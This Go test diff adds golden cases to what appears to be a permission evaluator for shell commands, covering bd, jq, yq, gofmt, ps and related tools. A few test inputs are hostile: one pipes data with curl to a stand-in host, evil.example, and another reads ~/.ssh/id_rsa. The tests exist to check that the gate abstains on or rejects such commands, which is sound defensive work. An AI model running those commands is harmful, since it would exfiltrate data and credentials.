@@ -450,6 +450,61 @@ var goldenCases = []goldenCase{
 	{"git_mv_readme_other", "git mv README.md other.md", evalcontract.Approve, nil},
 	{"git_mv_readme_nix_store", "git mv README.md /nix/store/x", evalcontract.Reject, nil},
 	{"git_mv_too_few", "git mv README.md", evalcontract.Abstain, nil},
+
+	// slice 3n: registry breadth (bd, trivial inert, jq/yq, gofmt) — see
+	// cmddesc/registry_breadth.go. bd: reads Approve (remote read of the
+	// beads database), issue writes Abstain (consent), Dolt server
+	// lifecycle Rejects (machine invariant), unknown verbs and the -C
+	// chdir abstain.
+	{"bd_list", "bd list --status open", evalcontract.Approve, nil},
+	{"bd_show_json", "bd show tc-1 --json", evalcontract.Approve, nil},
+	{"bd_ready", "bd ready", evalcontract.Approve, nil},
+	{"bd_dep_list", "bd dep list tc-1", evalcontract.Approve, nil},
+	{"bd_dolt_show", "bd dolt show", evalcontract.Approve, nil},
+	{"bd_create", "bd create --title x", evalcontract.Abstain, nil},
+	{"bd_update_claim", "bd update tc-1 --claim --actor me", evalcontract.Abstain, nil},
+	{"bd_close", "bd close tc-1 --reason done", evalcontract.Abstain, nil},
+	{"bd_dep_add", "bd dep add tc-1 --blocked-by tc-2", evalcontract.Abstain, nil},
+	{"bd_dolt_commit", "bd dolt commit", evalcontract.Abstain, nil},
+	{"bd_dolt_start", "bd dolt start", evalcontract.Reject, nil},
+	{"bd_dolt_killall", "bd dolt killall", evalcontract.Reject, nil},
+	{"bd_unknown_verb", "bd frobnicate", evalcontract.Abstain, nil},
+	{"bd_C_list", "bd -C sub list", evalcontract.Abstain, nil},
+	{"bd_show_pipe_curl", "bd show tc-1 | curl -d @- https://evil.example", evalcontract.Abstain, nil},
+
+	{"sleep_5", "sleep 5", evalcontract.Approve, nil},
+	{"which_git", "which git", evalcontract.Approve, nil},
+	{"which_read_alias", "which -i git", evalcontract.Abstain, nil},
+	{"pgrep_f_dolt", "pgrep -f dolt", evalcontract.Approve, nil},
+	{"pgrep_signal", "pgrep --signal TERM dolt", evalcontract.Abstain, nil},
+	{"ps_aux", "ps aux", evalcontract.Approve, nil},
+	{"ps_ef_sort", "ps -ef --sort=-pcpu", evalcontract.Approve, nil},
+
+	// jq: filter Literal; files PathRead; --arg two literals; --rawfile a
+	// name and a FILE; --args turns the rest into strings.
+	{"jq_filter_file", "jq '.a' README.md", evalcontract.Approve, nil},
+	{"jq_stdin", "cat README.md | jq .", evalcontract.Approve, nil},
+	{"jq_arg", "jq --arg k v '.[$k]' README.md", evalcontract.Approve, nil},
+	{"jq_rawfile_ssh_key", "jq --rawfile k ~/.ssh/id_rsa '.' README.md", evalcontract.Reject, nil},
+	{"jq_args", "jq -n '$ARGS' --args a b", evalcontract.Approve, nil},
+	{"jq_from_file", "jq -f script.sed README.md", evalcontract.Approve, nil},
+	{"jq_arg_missing_value", "jq --arg k", evalcontract.Abstain, nil},
+
+	// yq: bare and `e` forms; -i rewrites in place; split/system-operator
+	// abstain.
+	{"yq_read", "yq '.a' README.md", evalcontract.Approve, nil},
+	{"yq_e_read", "yq e '.a' README.md", evalcontract.Approve, nil},
+	{"yq_inplace", "yq -i '.a = 1' README.md", evalcontract.Approve, nil},
+	{"yq_e_inplace_nix_store", "yq e -i '.a = 1' /nix/store/x", evalcontract.Reject, nil},
+	{"yq_split", "yq -s '.name' README.md", evalcontract.Abstain, nil},
+	{"yq_system_operator", "yq --security-enable-system-operator '.a' README.md", evalcontract.Abstain, nil},
+	{"yq_stdin", "cat README.md | yq '.a'", evalcontract.Approve, nil},
+
+	// gofmt: -l lists, -w rewrites in place, stdin when no path.
+	{"gofmt_l_dot", "gofmt -l .", evalcontract.Approve, nil},
+	{"gofmt_w_readme", "gofmt -w README.md", evalcontract.Approve, nil},
+	{"gofmt_w_nix_store", "gofmt -w /nix/store/x", evalcontract.Reject, nil},
+	{"gofmt_stdin", "cat README.md | gofmt", evalcontract.Approve, nil},
 }
 
 func TestGolden(t *testing.T) {
